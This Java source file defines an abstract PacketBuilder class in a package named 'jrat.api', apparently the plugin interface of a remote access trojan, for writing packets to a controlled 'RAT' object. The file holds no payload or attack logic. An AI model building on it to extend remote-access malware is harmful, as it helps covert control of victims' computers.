package jrat.api;

import java.io.DataInputStream;
import java.io.DataOutputStream;

public abstract class PacketBuilder {

	private byte header;
	private RATObject rat;

	public PacketBuilder(byte header, RATObject rat) {
		this.header = header;
		this.rat = rat;
	}

	/**
	 * Abstract write method, called when ready to write
	 * 
	 * @param dos
	 * @param dis
	 * @throws Exception
	 */
	public abstract void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception;

	/**
	 * 
	 * @return The header of this packet
	 */
	public byte getHeader() {
		return header;
	}

	/**
	 * 
	 * @return The rat object to write this packet to
	 */
	public RATObject getRATObject() {
		return rat;
	}

}
